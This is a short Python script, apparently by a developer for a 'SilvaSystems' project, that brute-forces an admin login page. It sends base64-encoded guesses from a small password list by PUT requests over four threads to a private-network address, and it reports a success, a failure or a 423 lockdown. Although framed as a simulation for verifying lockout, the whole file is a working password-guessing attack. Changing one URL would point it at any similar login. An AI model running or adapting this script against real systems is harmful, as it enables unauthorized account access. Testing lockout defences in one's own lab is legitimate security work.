import requests
import base64
import time
import concurrent.futures

# [!] By Colton Silva (chinawaterstealers).
# SilvaSystems Brute-Force Simulator
# Target: admin/pass.php

TARGET_URL = "http://192.168.100.44/admin/pass.php"
PASSWORD_LIST = ["123456", "admin", "password", "qwerty", "silvasystems", "ussr", "vincemcmahon", "wrongpass"] * 5
THREADS = 4

def attempt_login(password):
    # Encode password in Base64 as required by pass.php
    payload = base64.b64encode(password.encode()).decode()
    
    try:
        # SilvaSystems uses PUT for login attempts
        response = requests.put(TARGET_URL, data=payload, timeout=5)
        
        status = response.status_code
        if status == 200:
            print(f"[SUCCESS] Password Found: {password}")
            return True
        elif status == 423:
            print(f"[LOCKED] System into Lockdown! Attack terminated.")
            return "LOCKED"
        elif status == 401:
            print(f"[FAIL] {password} - 401 Unauthorized")
        else:
            print(f"[INFO] {password} - Status: {status}")
            
    except Exception as e:
        print(f"[ERROR] Connection lost: {e}")
    
    return False

def run_simulation():
    print(f"--- SilvaSystems Brute-Force Simulation ---")
    print(f"Targeting: {TARGET_URL}")
    print(f"Payloads: {len(PASSWORD_LIST)} attempts")
    print(f"Threads: {THREADS}")
    print("------------------------------------------")

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        results = executor.map(attempt_login, PASSWORD_LIST)
        for res in list(results):
            if res == "LOCKED":
                print("\n[FINALIZE] Lockdown protocol verified successfully.")
                return

if __name__ == "__main__":
    run_simulation()
